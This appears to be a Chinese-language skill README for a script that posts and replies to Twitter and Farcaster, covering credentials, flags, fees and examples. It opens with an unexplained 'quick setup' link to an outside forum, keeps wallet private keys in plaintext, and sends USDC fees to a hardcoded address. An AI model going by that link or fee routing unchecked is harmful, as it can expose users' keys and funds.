---
author: 무펭이 🐧
---

# 社交媒体发布工具 🐧  
⏹ 快速设置请访问：https://openclawcli.forum  

该工具支持自动验证字符长度并处理图片上传，可向 Twitter 和/或 Farcaster 发布内容。  

## 主要功能  
- ✅ 仅向 Twitter 发布  
- ✅ 仅向 Farcaster 发布  
- ✅ 同时向两个平台发布  
- ✅ **回复推文和直播**：能在两个平台上回复特定内容  
- ✅ **草稿预览**：发布前可查看预览效果  
- ✅ 验证字符/字节长度  
- ✅ 图片上传支持（适用于帖子和回复）  
- ✅ **分页显示长文本**：自动将长文本分割成多条帖子  
- ✅ **缩短链接**：使用 TinyURL 缩短链接（节省字符）  
- ✅ 超过限制时自动截断（可选）  

## 平台限制  
- **Twitter：** 最多 252 个字符（实际可显示 280 个字符，预留 10% 的缓冲空间）  
- **Farcaster：** 最多 288 字节（实际可显示 320 个字节，预留 10% 的缓冲空间）  

## 设置与凭据  

### Twitter 设置  
**所需凭据**（存储在 `/home/phan_harry/.openclaw/.env` 文件中）：  
```bash
X_CONSUMER_KEY=your_consumer_key
X_CONSUMER_SECRET=your_consumer_secret
X_ACCESS_TOKEN=your_access_token
X_ACCESS_TOKEN_SECRET=your_access_token_secret
X_USERNAME=your_username
X_USER_ID=your_user_id
```  

**获取凭据的方法：**  
1. **申请 Twitter 开发者账户**：  
   - 访问 https://developer.twitter.com/en/portal/dashboard  
   - 申请开发者访问权限  
   - 等待审核（通常需要 1-2 天）  

2. **启用按使用量计费的支付方式**：  
   - 在开发者门户中设置支付方式（信用卡）  
   - 无需订阅费用，仅按实际使用的 API 请求次数收费  
   - 每次 API 请求都会被计费  

3. **创建应用程序**：  
   - 在开发者门户中创建新应用程序  
   - 应用程序名称：例如 “Social Post Bot”  
   - 设置权限为 “读写”  

4. **生成凭据**：  
   - 在 “Keys and Tokens” 标签页中获取 Consumer Key 和 Secret  
   - 点击 “Authentication Tokens” 下的 “Generate” 生成 Access Token 和 Secret  
   - 请妥善保管这 4 个凭据  

**测试凭据：**  
```bash
# Dry run (won't post)
scripts/post.sh --twitter --dry-run "Test message"
```  

### Farcaster 设置  
**所需凭据**（存储在 `/home/phan_harry/.openclaw/farcaster-credentials.json` 文件中）：  
```json
{
  "fid": "your_farcaster_id",
  "custodyAddress": "0x...",
  "custodyPrivateKey": "0x...",
  "signerPublicKey": "0x...",
  "signerPrivateKey": "0x...",
  "createdAt": "2026-01-01T00:00:00.000Z"
}
```  

**获取凭据的方法：**  
1. **使用 farcaster-agent 工具创建账户**：  
   ```bash
   # This will guide you through:
   # - Creating a wallet
   # - Registering FID
   # - Adding signer key
   # - Automatically saving credentials
   
   # See: /skills/farcaster-agent/SKILL.md
   ```  

2. **或使用现有凭据**：  
   - 如果您已有 Farcaster 账户：  
   - 导出您的保管钱包私钥和签名者私钥  
   - 手动创建 JSON 文件  

3. **为保管钱包充值（必需）**：  
   ```bash
   # Check current balance
   scripts/check-balance.sh
   
   # Send USDC to custody address on Base chain
   # Minimum: 0.1 USDC (~100 casts)
   # Recommended: 1-5 USDC (1000-5000 casts)
   ```  

4. **验证设置：**  
   ```bash
   # Check credentials exist
   ls -la ~/.openclaw/farcaster-credentials.json
   
   # Check wallet balance
   scripts/check-balance.sh
   
   # Test posting (dry run)
   scripts/post.sh --farcaster --dry-run "Test message"
   ```  

**安全提示：**  
- ⚠️ **切勿分享您的私钥**  
- ⚠️ 凭据以明文形式存储，请确保系统安全  
- ⚠️ `.env` 文件的权限应设置为 `600`（仅允许所有者读写）  
- ⚠️ 请妥善备份您的凭据  

## 使用方法  

### 发布内容  
#### 仅发布文本：  
```bash
# Post to both platforms
scripts/post.sh "Your message here"

# Twitter only
scripts/post.sh --twitter "Your message"

# Farcaster only
scripts/post.sh --farcaster "Your message"
```  

#### 带图片发布：  
```bash
# Post to both platforms with image
scripts/post.sh --image /path/to/image.jpg "Your caption"

# Twitter only with image
scripts/post.sh --twitter --image /path/to/image.jpg "Caption"

# Farcaster only with image
scripts/post.sh --farcaster --image /path/to/image.jpg "Caption"
```  

### 回复内容  
#### 回复 Twitter 推文：  
```bash
# Reply to a tweet
scripts/reply.sh --twitter TWEET_ID "Your reply"

# Reply with image
scripts/reply.sh --twitter TWEET_ID --image /path/to/image.jpg "Reply with image"

# Get tweet ID from URL: twitter.com/user/status/[TWEET_ID]
scripts/reply.sh --twitter 1234567890123456789 "Great point!"
```  

#### 回复 Farcaster 直播：  
```bash
# Reply to a cast
scripts/reply.sh --farcaster CAST_HASH "Your reply"

# Reply with image
scripts/reply.sh --farcaster 0xabcd1234... --image /path/to/image.jpg "Reply with image"

# Get cast hash from URL: farcaster.xyz/~/conversations/[HASH]
scripts/reply.sh --farcaster 0xa1b2c3d4e5f6... "Interesting perspective!"
```  

#### 同时回复两个平台：  
```bash
# Reply to both (if you have corresponding IDs on both platforms)
scripts/reply.sh --twitter 123456 --farcaster 0xabcd... "Great discussion!"
```  

### 配置选项  
#### 对于 `post.sh`（发布工具）：  
- `--twitter`：仅向 Twitter 发布  
- `--farcaster`：仅向 Farcaster 发布  
- `--image <路径>`：附加图片  
- `--thread`：将长文本分割成多条帖子  
- `--shorten-links`：缩短链接以节省字符  
- `--truncate`：超过限制时自动截断  
- `--dry-run`：预览内容而不实际发布  
- `-y, --yes`：跳过确认提示（自动确认）  

#### 对于 `reply.sh`（回复工具）：  
- `--twitter <推文 ID>`：回复指定 ID 的 Twitter 推文  
- `--farcaster <直播哈希`：回复指定哈希的 Farcaster 直播  
- `--image <路径>`：在回复中附加图片  
- `--shorten-links`：缩短链接以节省字符  
- `--truncate`：超过限制时自动截断  
- `--dry-run`：预览内容而不实际回复  
- `-y, --yes`：跳过确认提示（自动确认）  

## 示例  
### 发布示例：  
```bash
# Quick post to both
scripts/post.sh "gm! Building onchain 🦞"

# Twitter announcement with image
scripts/post.sh --twitter --image ~/screenshot.png "New feature shipped! 🚀"

# Farcaster only
scripts/post.sh --farcaster "Just published credential-manager to ClawHub!"

# Long text as thread (auto-numbered)
scripts/post.sh --thread "This is a very long announcement that exceeds the character limit. It will be automatically split into multiple numbered posts. Each part will be posted sequentially to create a thread. (1/3), (2/3), (3/3)"

# Shorten URLs to save characters
scripts/post.sh --shorten-links "Check out this amazing project: https://github.com/very-long-organization-name/very-long-repository-name"

# Combine thread + link shortening
scripts/post.sh --thread --shorten-links "Long text with multiple links that will be shortened and split into a thread if needed"

# Both platforms, auto-truncate long text
scripts/post.sh --truncate "Very long message that might exceed limits..."

# Preview without confirmation (for automated workflows)
scripts/post.sh --yes "Automated post from CI/CD"
```  

### 回复示例：  
```bash
# Reply to a Twitter thread
scripts/reply.sh --twitter 1234567890123456789 "Totally agree with this take! 💯"

# Reply to Farcaster cast
scripts/reply.sh --farcaster 0xa1b2c3d4e5f6... "Great insight! Have you considered...?"

# Reply with shortened links
scripts/reply.sh --twitter 123456 --shorten-links "Here's more info: https://example.com/very-long-article-url"

# Reply with image
scripts/reply.sh --twitter 123456 --image ~/chart.png "Here's the data to support this"

# Reply to both platforms (same message)
scripts/reply.sh --twitter 123456 --farcaster 0xabc123 "This is exactly right 🎯"

# Quick reply without confirmation
scripts/reply.sh --twitter 123456 --yes "Quick acknowledgment"

# Dry run to preview reply
scripts/reply.sh --twitter 123456 --dry-run "Test reply preview"
```  

**草稿预览**  
发布前会显示草稿预览：  
```
=== Draft Preview ===

Text to post:
─────────────────────────────────────────────
Your message here
─────────────────────────────────────────────

Targets:
  • Twitter
  • Farcaster

Proceed with posting? (y/n):
```  
- **交互模式**：会提示用户确认  
- **非交互模式/自动模式**：使用 `--yes` 选项跳过确认提示  
- **预览模式**：使用 `--dry-run` 选项预览内容而不进行实际发布  

## 所需条件：  
- `.env` 文件中包含 Twitter 凭据（X_CONSUMER_KEY, X_CONSUMER_SECRET, X_ACCESS_TOKEN, X_ACCESS_TOKEN_SECRET）  
- `/home/phan_harry/.openclaw/farcaster-credentials.json` 文件中包含 Farcaster 凭据  
- **保管钱包中需有 USDC**：每次 Farcaster 直播费用为 0.001 USDC  
- 图片处理依赖 `curl` 和 `jq` 工具  

## 费用说明  
### Twitter  
- **完全按使用量计费**：无订阅等级  
- 每次 API 请求都会被计费  
- 无月费或最低使用量要求  
- 支付方式：通过 Twitter 开发者门户使用信用卡  
- 使用 OAuth 1.0a 协议（无需区块链或 USDC）  
- 需要经过审核的 Twitter 开发者账户及启用的计费功能  

**官方价格信息：** https://developer.twitter.com/#pricing  

**重要说明：**  
- Twitter 的 API 服务已取消所有订阅等级，改为纯按使用量计费模式。  
- 每次 API 请求都会被计费。  

### Farcaster  
- 每次 Farcaster 直播费用为 0.001 USDC（通过 x402 协议支付）  
- 费用从保管钱包中扣除  
- 费用会发送到 Neynar Hub（地址：`0xA6a8736f18f383f1cc2d938576933E5eA7Df01A1`）  
- 大约 1 USDC 可用于 1000 次直播  

**查看余额：**  
```bash
# Quick check
scripts/check-balance.sh

# Manual check
jq -r '.custodyAddress' ~/.openclaw/farcaster-credentials.json
# View on basescan.org
```  
**为钱包充值**：将 USDC 发送到保管钱包地址（支持跨链转账）。  

## 图片托管  
- **Twitter**：通过 Twitter API 直接上传  
- **Farcaster**：图片会上传到 imgur 并生成公开链接  

**错误处理**  
- 发布前会显示字符/字节数量  
- 超过限制时会发出警告  
- 提供截断或中止操作的选项  
- 发布前会验证凭据的有效性  

---

> 🐧 由 **무펭이** 开发 — [무펭이즘(Mupengism)](https://github.com/mupeng) 生态系统中的工具